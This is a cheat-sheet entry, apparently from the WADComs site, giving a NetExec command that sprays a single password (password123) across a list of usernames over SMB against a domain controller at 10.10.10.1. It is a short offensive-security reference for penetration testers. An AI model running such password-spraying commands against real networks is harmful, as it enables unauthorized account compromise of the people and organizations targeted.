<!-- source: https://github.com/WADComs/WADComs.github.io/blob/31283f1532ff1b1c9c8e524bacb0fbc6e251429b/_wadcoms/NetExec-SMB-Password-Spray.md -->
---
description: |
  "NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks." - https://www.netexec.wiki/. This command will perform password spraying over SMB against the domain controller.

  Command Reference:

  	Domain Controller IP: 10.10.10.1

  	Username List: users.txt

  	Password: password123

command: |
  nxc smb 10.10.10.1 -u users.txt -p password123
items:
  - Username
services:
  - SMB
attack_types:
  - Exploitation
OS:
  - Linux
references:
  - https://github.com/Pennyw0rth/NetExec
  - https://www.netexec.wiki/
---
